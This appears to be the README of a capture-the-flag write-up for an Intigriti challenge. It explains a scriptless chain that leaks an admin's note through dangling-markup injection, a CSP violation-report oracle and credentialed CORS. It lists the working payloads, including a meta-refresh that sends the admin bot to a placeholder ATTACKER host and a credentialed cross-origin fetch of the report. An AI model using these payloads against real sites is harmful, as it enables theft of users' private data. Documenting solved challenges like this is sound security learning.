# intigriti-0626

**Inside Job — leaking the admin's note through a CSP report oracle**

My write-up for **Intigriti's June 2026 challenge (0626)** — a scriptless solution that reads the admin's private note under a strict, nonce-based CSP, with **no JavaScript executing on the target origin**.

🔗 **Live write-up:** https://rajib-mahmud.github.io/intigriti-0626/

---

## TL;DR

The flag (the admin's private note) is exfiltrated **without script execution** on the challenge origin, by chaining three flaws:

1. **Reflected HTML injection (scriptless XSS)** on `/search` — the `description` parameter is reflected unencoded into a `<meta>` tag in `<head>`.
2. **Attacker-controlled CSP `report-uri`** — the `owner` parameter dictates where CSP violation reports are stored.
3. **Credentialed CORS + `SameSite=None`** on `/csp-report/<owner>` — the endpoint reflects the request `Origin` with `Access-Control-Allow-Credentials: true`, and the session cookie rides cross-site.

A strict CSP (`default-src 'none'; script-src 'nonce-…'`) blocks script execution but **not** markup injection. A dangling-markup `<img>` captures every rendered note into a blocked sub-resource URL; the resulting CSP violation report leaks the notes via its `blocked-uri`, which is then read cross-origin using the CORS bug. Zero clicks, cross-browser.

---

## The chain

| # | Step | Param | Value |
|---|------|-------|-------|
| 1 | Bounce the admin bot to the attacker page (CSP-allowed meta refresh, via `/report`) | `q` | `ZZ<meta http-equiv=refresh content=0;url=https://ATTACKER/#>` |
| 2 | Dangling-markup capture of all notes | `description` | `"><img src='/LK` |
| 3 | Close the capture after the notes | `q` | `'` |
| 4 | Route the CSP report to a readable bucket | `owner` | `admin` |
| 5 | Read the report cross-origin with the admin's cookie | — | `fetch('/csp-report/admin', {credentials:'include'})` |

> In `blocked-uri` the flag is URL-encoded (`{` → `%7B`, `}` → `%7D`) — decode before matching.

---

## Tags

`Scriptless XSS` · `Dangling Markup` · `CSP Report Oracle` · `CORS + Credentials` · `SameSite=None` · `Zero Interaction`

---

## Author

**rajib_mahmud** — Intigriti researcher
Write-up for Intigriti Challenge 0626 — *Inside Job* · June 2026
